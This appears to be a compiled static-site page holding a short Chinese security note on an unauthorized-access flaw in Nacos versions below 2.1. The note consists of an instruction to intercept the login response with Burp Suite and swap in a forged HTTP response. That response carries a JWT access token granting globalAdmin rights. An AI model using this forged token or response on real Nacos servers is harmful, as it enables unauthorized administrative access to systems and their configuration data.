import{_ as s,c as n,o as a,a4 as e}from"./chunks/framework.BG61BEI0.js";const p="/assets/image-20240522093506783.DOuK0Fyv.png",y=JSON.parse('{"title":"","description":"","frontmatter":{},"headers":[],"relativePath":"01-Dev/01.03-网络安全/安全漏洞/Nacos-2.1以下的未授权访问漏洞.md","filePath":"01-Dev/01.03-网络安全/安全漏洞/Nacos-2.1以下的未授权访问漏洞.md"}'),t={name:"01-Dev/01.03-网络安全/安全漏洞/Nacos-2.1以下的未授权访问漏洞.md"},o=e('<p><img src="'+p+`" alt="" loading="lazy"></p><p>或 页面 BP 抓包替换响应包内容</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span>HTTP/1.1 200</span></span>
<span class="line"><span>Date: Thu, 10 Nov 2022 01:27:16 GMT</span></span>
<span class="line"><span>Content-Type: application/json</span></span>
<span class="line"><span>Content-Length: 13</span></span>
<span class="line"><span>Connection: close</span></span>
<span class="line"><span>Vary: Origin</span></span>
<span class="line"><span>Vary: Access-Control-Request-Method</span></span>
<span class="line"><span>Vary: Access-Control-Request-Headers</span></span>
<span class="line"><span>Content-Security-Policy: script-src &#39;self&#39;</span></span>
<span class="line"><span>Server: elb</span></span>
<span class="line"><span></span></span>
<span class="line"><span>{&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true}</span></span></code></pre></div>`,3),c=[o];function i(l,_,r,d,u,h){return a(),n("div",null,c)}const g=s(t,[["render",i]]);export{y as __pageData,g as default};
